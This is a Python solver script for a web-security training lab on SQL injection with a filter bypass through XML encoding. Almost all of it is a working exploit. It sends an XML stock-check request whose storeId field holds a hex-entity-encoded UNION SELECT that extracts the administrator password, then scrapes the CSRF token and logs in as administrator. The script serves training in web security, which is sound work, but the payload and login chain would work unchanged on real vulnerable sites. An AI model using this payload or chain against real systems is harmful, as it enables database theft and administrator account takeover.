from colorama import Fore
import requests
from colorama import Fore
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection with filter bypass via XML encoding"

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into storeId XML element to retrieve administrator password using UNION-based attack\n2. Extract administrator password from the response body\n3. Fetch the login page\n4. Extract the csrf token and session cookie\n5. Login as the administrator\n6. Fetch the administrator profile\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        print(Fore.WHITE + "[1] Injecting payload to retrieve administrator password using UNION-based attack.. ", end="", flush=True)

        # XML-encoded SQLi payload
        xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>3</productId>
    <storeId>1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;</storeId>
</stockCheck>"""
        headers = { "Content-Type": "application/xml" }

        r = session.post(f"{url.rstrip('/')}/product/stock", data=xml_payload, headers=headers)
        print(Fore.GREEN + "OK")

        print(Fore.WHITE + "[2] Extracting administrator password from the response.. ", end="", flush=True)
        admin_password = re.findall(r"\n(.*)", r.text)[0]
        print(Fore.GREEN + "OK" + Fore.WHITE + f" => {Fore.YELLOW}{admin_password}")

        print(Fore.WHITE + "[3] Fetching login page.. ", end="", flush=True)
        login_page = session.get(f"{url.rstrip('/')}/login")
        print(Fore.GREEN + "OK")

        print(Fore.WHITE + "[4] Extracting CSRF token and session cookie.. ", end="", flush=True)
        csrf_token = re.search(r'name="csrf"\s+value="(.+?)"', login_page.text).group(1)
        print(Fore.GREEN + "OK")

        print(Fore.WHITE + "[5] Logging in as administrator.. ", end="", flush=True)
        data = {
            "username": "administrator",
            "password": admin_password,
            "csrf": csrf_token
        }
        r = session.post(f"{url.rstrip('/')}/login", data=data)
        print(Fore.GREEN + "OK")

        print(Fore.WHITE + "[6] Fetching admin profile.. ", end="", flush=True)
        r = session.get(f"{url.rstrip('/')}/my-account")
        print(Fore.GREEN + "OK")

        if "Your username is: administrator" in r.text:
            print(Fore.WHITE + "The lab should be marked now as " + Fore.GREEN + "solved")
            return True
        else:
            print(Fore.RED + "[-] Exploit did not succeed.")
            return False

    except Exception as e:
        print(Fore.RED + f"[!] Error occurred: {e}")
        return False
